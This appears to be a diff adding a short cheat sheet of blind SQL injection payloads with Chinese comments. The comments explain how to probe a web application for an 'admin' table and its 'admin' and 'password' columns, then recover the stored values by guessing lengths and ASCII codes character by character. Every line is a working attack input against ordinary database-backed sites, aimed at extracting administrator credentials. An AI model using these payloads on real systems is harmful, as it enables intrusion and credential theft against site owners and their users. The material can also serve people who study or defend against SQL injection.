@@ -1,0 +1,6 @@
+and exists(select*from admin)#如果网页可以正常显示则表明该数据库存在admin表
+and exists(select admin from admin)#如果网页可以正常显示则表明数据库有admin列
+and exists(select password from admin)#如果网页可以正常显示则表明数据库有password列
+and (select top 1 len(admin)from admin)>1#网页可以正常显示则在最后加一一直试到数据库出错如果为and (select top 1 len(admin)from admin)>5网页出现数据库出错则该字段长度为5
+
+and (select top 1 asc(mid(admin,1,1))from admin)>1#依次试，到97出现错误了，则第一条记录的第一位字符的ascii码为97
